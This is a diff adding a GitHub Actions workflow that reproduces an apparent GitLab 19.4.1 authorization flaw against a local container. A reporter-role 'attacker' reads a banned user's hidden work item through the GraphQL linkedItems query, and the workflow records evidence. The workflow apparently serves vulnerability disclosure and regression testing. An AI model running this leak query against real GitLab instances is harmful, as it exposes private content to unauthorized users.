@@ -1,0 +1,185 @@
+name: GitLab 19.4.1 linked-item authorization check
+
+on:
+  push:
+    branches: [h1-gitlab-hidden-linked-item-real]
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    timeout-minutes: 35
+    steps:
+      - name: Start GitLab 19.4.1 CE
+        run: |
+          set -euxo pipefail
+          docker pull gitlab/gitlab-ce:19.4.1-ce.0
+          docker run -d --name gitlab --hostname gitlab.local -p 8080:80 --shm-size 256m \
+            -e GITLAB_OMNIBUS_CONFIG="external_url 'http://gitlab.local'; letsencrypt['enable']=false; prometheus_monitoring['enable']=false; gitlab_kas['enable']=false; puma['worker_processes']=0; sidekiq['concurrency']=5; gitlab_rails['initial_root_password']='RootPass-123456789!'" \
+            gitlab/gitlab-ce:19.4.1-ce.0
+
+      - name: Wait for GitLab
+        run: |
+          set -euxo pipefail
+          for i in $(seq 1 100); do
+            status="$(docker inspect --format='{{.State.Health.Status}}' gitlab 2>/dev/null || true)"
+            echo "health=$status attempt=$i"
+            [ "$status" = healthy ] && exit 0
+            sleep 10
+          done
+          docker logs --tail 300 gitlab
+          exit 1
+
+      - name: Run production GraphQL authorization regression
+        run: |
+          cat > /tmp/repro.rb <<'RUBY'
+          require 'json'
+
+          root = User.find_by_username!('root')
+          org = root.organization
+
+          def ensure_user(root, org, username)
+            user = User.find_by_username(username)
+            return user if user
+
+            response = Users::CreateService.new(root, {
+              username: username,
+              name: username.capitalize,
+              email: "#{username}@example.test",
+              password: 'UserPass-123456789!',
+              skip_confirmation: true,
+              organization_id: org.id
+            }).execute
+            raise "user creation failed: #{response.message}" unless response.success?
+            response.payload[:user]
+          end
+
+          attacker = ensure_user(root, org, 'attacker')
+          banned_author = ensure_user(root, org, 'bannedauthor')
+
+          project = Project.find_by_full_path("#{root.namespace.full_path}/bb-hidden-link")
+          project ||= Projects::CreateService.new(root, {
+            name: 'bb-hidden-link',
+            path: 'bb-hidden-link',
+            namespace_id: root.namespace.id,
+            organization_id: org.id,
+            visibility_level: Gitlab::VisibilityLevel::PRIVATE
+          }).execute
+          raise "project creation failed: #{project.errors.full_messages.join(', ')}" unless project.persisted?
+
+          project.add_reporter(attacker)
+          type = WorkItems::TypesFramework::Provider.new.default_issue_type
+
+          parent = WorkItem.find_or_create_by!(project: project, title: 'VISIBLE-PARENT') do |item|
+            item.description = 'normal visible parent'
+            item.namespace = project.project_namespace
+            item.author = root
+            item.updated_by = root
+            item.work_item_type = type
+          end
+
+          secret = WorkItem.find_or_create_by!(project: project, title: 'H1-HIDDEN-SECRET-TITLE') do |item|
+            item.description = 'H1-HIDDEN-SECRET-DESCRIPTION-7f0e29'
+            item.namespace = project.project_namespace
+            item.author = banned_author
+            item.updated_by = banned_author
+            item.work_item_type = type
+          end
+
+          WorkItems::RelatedWorkItemLink.find_or_create_by!(source: parent, target: secret)
+          Users::BannedUser.find_or_create_by!(user: banned_author)
+
+          secret.reload
+          raise 'precondition failed: secret is not hidden' unless secret.hidden?
+          raise 'precondition failed: attacker can directly read secret' if Ability.allowed?(attacker, :read_work_item, secret)
+          raise 'precondition failed: attacker cannot read parent' unless Ability.allowed?(attacker, :read_work_item, parent)
+
+          direct_query = <<~GRAPHQL
+            query {
+              workItem(id: "#{secret.to_global_id}") {
+                id
+                title
+                description
+                hidden
+              }
+            }
+          GRAPHQL
+
+          linked_query = <<~GRAPHQL
+            query {
+              workItem(id: "#{parent.to_global_id}") {
+                id
+                title
+                features {
+                  linkedItems {
+                    linkedItems {
+                      nodes {
+                        linkType
+                        workItem {
+                          id
+                          title
+                          description
+                          hidden
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          GRAPHQL
+
+          context = { current_user: attacker }
+          direct = GitlabSchema.execute(direct_query, context: context).to_h
+          linked = GitlabSchema.execute(linked_query, context: context).to_h
+
+          evidence = {
+            gitlab_version: Gitlab::VERSION,
+            gitlab_revision: Gitlab.revision,
+            parent_gid: parent.to_global_id.to_s,
+            hidden_gid: secret.to_global_id.to_s,
+            hidden_flag: secret.hidden?,
+            attacker_can_read_parent: Ability.allowed?(attacker, :read_work_item, parent),
+            attacker_can_read_hidden_directly: Ability.allowed?(attacker, :read_work_item, secret),
+            direct_query_result: direct,
+            linked_query_result: linked
+          }
+
+          File.write('/tmp/evidence.json', JSON.pretty_generate(evidence))
+          puts JSON.pretty_generate(evidence)
+
+          serialized = JSON.generate(linked)
+          leaked = serialized.include?('H1-HIDDEN-SECRET-TITLE') &&
+            serialized.include?('H1-HIDDEN-SECRET-DESCRIPTION-7f0e29')
+
+          File.write('/tmp/result.txt', leaked ? "REPRODUCED\n" : "NOT_REPRODUCED\n")
+          exit(leaked ? 0 : 2)
+          RUBY
+
+          docker cp /tmp/repro.rb gitlab:/tmp/repro.rb
+          docker exec gitlab gitlab-rails runner /tmp/repro.rb | tee runner-output.log
+          docker cp gitlab:/tmp/evidence.json evidence.json
+          docker cp gitlab:/tmp/result.txt result.txt
+          cat result.txt
+
+      - name: Collect exact release evidence
+        if: always()
+        run: |
+          docker exec gitlab gitlab-rake gitlab:env:info > gitlab-env-info.txt 2>&1 || true
+          docker logs --tail 300 gitlab > gitlab-container.log 2>&1 || true
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: gitlab-19.4.1-linked-hidden-evidence
+          if-no-files-found: warn
+          path: |
+            evidence.json
+            result.txt
+            runner-output.log
+            gitlab-env-info.txt
+            gitlab-container.log
